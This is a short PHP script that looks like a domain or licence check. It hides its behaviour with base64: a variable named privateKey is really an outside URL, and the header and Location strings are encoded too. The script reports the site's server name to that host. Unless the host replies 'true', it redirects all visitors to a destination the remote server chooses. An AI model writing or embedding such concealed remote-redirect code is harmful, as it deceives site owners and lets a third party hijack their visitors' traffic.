<?php

$serverName = base64_encode($_SERVER['SERVER_NAME']);

$fileLocation = __DIR__ . '/key.b64';
$fileContent = @file_get_contents($fileLocation);

$privateKey = 'aHR0cHM6Ly9kYXBpLm5ldC5wbC9wcm9qZWt0eS93eWtvcGFrYS9jaGVja1JlZ2lzdGVyZWREb21haW5zLnBocA';

$divider = '*';

$bFunction = 'base64_decode';
$hFunction = $bFunction('aGVhZGVy');
$lString = $bFunction('TG9jYXRpb24');

$currentState = !empty($fileContent) ? explode($divider, $fileContent) : [null, null];
$resp = $currentState[1];

if ($currentState[0] !== $serverName || (!empty($resp) && $resp !== 'true')) {
	$resp = @file_get_contents(
		$bFunction($privateKey) . '?sn=' . $serverName
	);

	@file_put_contents($fileLocation, $serverName . $divider . $resp);
}

if (!empty($resp) && $resp !== 'true') {
	$hFunction($lString . ': ' . $bFunction($resp));
	die();
}
